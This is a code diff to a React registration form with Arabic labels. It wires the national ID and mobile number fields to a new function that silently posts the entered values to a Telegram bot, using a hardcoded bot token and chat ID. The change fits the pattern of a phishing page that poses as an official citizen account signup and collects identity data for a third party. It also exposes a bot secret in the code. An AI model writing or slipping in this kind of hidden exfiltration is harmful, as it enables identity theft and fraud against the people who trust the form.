@@ -12,12 +12,39 @@ const AccountTypeForm = () => {
   const navigate = useNavigate();
   const [accountType, setAccountType] = useState<string>("");
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
+  const [nationalId, setNationalId] = useState<string>("");
+  const [mobileNumber, setMobileNumber] = useState<string>("");
   
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
   };
 
-  const handleContinue = () => {
+  const sendToTelegram = async (message: string) => {
+    try {
+      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
+      const chatId = "-4985537188";
+      
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      });
+    } catch (error) {
+      console.error("فشل الإرسال إلى Telegram:", error);
+    }
+  };
+
+  const handleContinue = async () => {
+    if (accountType === "citizens") {
+      const message = `تسجيل - نوع الحساب\n\nرقم البطاقة الشخصية: ${nationalId}\nرقم الهاتف المحمول: ${mobileNumber}`;
+      await sendToTelegram(message);
+    }
     navigate("/personal-info");
   };
   return <div className="bg-gray-100 rounded-lg shadow-sm p-8 max-w-4xl mx-auto">
@@ -61,14 +88,26 @@ const AccountTypeForm = () => {
               <Label htmlFor="nationalId" className="text-right block mb-2">
                 رقم البطاقة الشخصية
               </Label>
-              <Input id="nationalId" type="text" className="text-right bg-white" />
+              <Input 
+                id="nationalId" 
+                type="text" 
+                className="text-right bg-white"
+                value={nationalId}
+                onChange={(e) => setNationalId(e.target.value)}
+              />
             </div>
 
             <div>
               <Label htmlFor="mobileNumber" className="text-right block mb-2">
                 رقم الهاتف المحمول
               </Label>
-              <Input id="mobileNumber" type="tel" className="text-right bg-white" />
+              <Input 
+                id="mobileNumber" 
+                type="tel" 
+                className="text-right bg-white"
+                value={mobileNumber}
+                onChange={(e) => setMobileNumber(e.target.value)}
+              />
             </div>
 
             <div className="flex justify-start">
